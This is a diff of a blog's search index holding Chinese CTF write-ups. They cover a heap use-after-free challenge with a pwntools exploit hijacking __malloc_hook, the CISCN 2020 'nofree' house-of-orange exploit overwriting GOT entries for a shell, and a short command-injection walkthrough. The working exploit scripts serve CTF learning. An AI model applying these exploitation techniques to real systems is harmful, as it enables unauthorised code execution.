+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>add</code>函数只允许3种堆块<br><code>edit</code>只允许修改两种<br><code>delete</code>也只允许释放两种<br>(那么第三种有什么用啊喂)</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>由于在<code>delete</code>之后没有讲指针置0,存在**<code>UAF</code>**漏洞,并且在<code>edit</code>的时候没有检查堆块是否已经被<code>free</code>,所以可以通过修改<code>fastbin</code>的<code>fd</code>指针达到任意地址写</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个功能</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
+
+<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>一开始我想通过<code>unsorted bin</code>的<code>UAF</code>,但是这里并没有办法(甚至没有<code>unsorted bin</code>)<br>于是试图通过<code>fastbin</code>的<code>fd</code>指针分配到<code>got表</code>附近,泄露<code>libc</code><br>查看一下 <code>got表</code>,寻找合适的size</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:	0x0000000000601e28	0x00007f1287400168</span><br><span class="line">0x602010:	0x00007f12871f0ee0	0x00000000004006a6</span><br><span class="line">0x602020:	0x00007f1286e7e690	0x00000000004006c6</span><br><span class="line">0x602030:	0x00000000004006d6	0x00007f1286f06250</span><br><span class="line">0x602040:	0x00007f1286e2f740	0x00007f1286e93130</span><br><span class="line">0x602050:	0x00007f1286e7ee70	0x0000000000400726</span><br><span class="line">0x602060:	0x0000000000400736	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:	0x00007f12871d4620	0x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:	0x00007f12871d38e0	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>看到在<code>0x602050</code>的地方有一个 <code>0x70</code>,高兴坏了,然而并不能分配到这里,而且就算是这附近的错位字节也不行(我在这里卡了好久没弄明白为什么,然后看了看<code>__malloc_hook-0x23</code>,发现错位字节的地方是<code>0x7f</code>)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:	0x12871d2260000000	0x000000000000007f</span><br><span class="line">0x7f12871d3afd:	0x1286e94e20000000	0x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>猜想可能是size检查的时候是一个<code>int</code>为单位,再次寻找size,发现<code>0x602030</code>的地方有一个<code>0x40</code>可以利用,但是会失败,可以分配到,然而<code>0x602038</code>是<code>read</code>函数,会破坏它的指针,从而影响程序<br>最后看到<code>0x602060</code>的地方也有<code>0x40</code>,并且下面存在<code>stdin</code>和<code>stdout</code>可以泄露,将<code>fd</code>指向这里</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
+<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>得到libc之后使用修改<code>__malloc_hook ==&gt; one_gadget</code> 就可以得到shell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
+<p>再一次分配一个堆块就能得到shell</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -2373,228 +2657,6 @@
       <tags>
         <tag>pwn</tag>
         <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn初赛-nofree</title>
-    <url>//ciscn_nofree.html</url>
-    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
-<p>由于我是懒狗，现在才想起来写wp（</p>
-<a id="more"></a>
-
-
-
-<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
-<p>没有开<code>pie</code>和<code>pelro</code></p>
-<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正如描述的那样，没有<code>free</code>选项</p>
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
-<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
-<p>导致了溢出</p>
-<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
-<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
-<p>详情请见CTFwiki</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
-<p>运行之后</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
-<p><code>topbin</code>被修改为一个小的值</p>
-<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
-<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
-<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
-<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
-<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
-<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020_新生赛_Exec</title>
-    <url>//buu_ACTF2020Exec.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-
-
-<p>点进靶机界面如下</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
-
-<p>结合题目名，猜测是命令执行</p>
-<p>输入<code>l | ls</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
-
-<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
-
-<p>使用<code>cat</code>命令读取</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020_新生赛_Include</title>
-    <url>//buu_ACTF2020Include.html</url>
